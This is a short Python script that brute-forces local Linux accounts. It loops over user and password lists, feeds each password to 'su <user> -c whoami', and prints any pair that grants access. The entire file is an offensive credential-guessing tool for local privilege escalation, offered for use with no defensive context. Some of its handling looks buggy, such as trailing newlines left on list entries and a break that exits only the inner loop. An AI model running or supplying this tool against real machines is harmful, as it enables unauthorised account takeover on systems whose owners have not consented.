from subprocess import PIPE,Popen, DEVNULL
from sys import argv


def CheckFile(possible_path: str)->[]:
    try:
        return open(possible_path, 'rb').readlines()
    except FileNotFoundError:
        return [bytes(possible_path,'utf-8')]


def main():
    user_pointer: str = argv[1]
    password_pointer: str = argv[2]
    users = CheckFile(argv[1])
    passwords = CheckFile(argv[2])

    for user in users:
        for password in passwords:
            su_test = Popen(
                ["su", user,"-c","whoami"],
                stdin=PIPE,
                stdout=PIPE,
                stderr=DEVNULL
            )

            stdout_data = su_test.communicate(input=password)[0]

            if user in stdout_data:
                print(f"[+] Success with {user.decode('utf-8')}:{password.decode('utf-8')}")
                break


if __name__ == "__main__":
    main()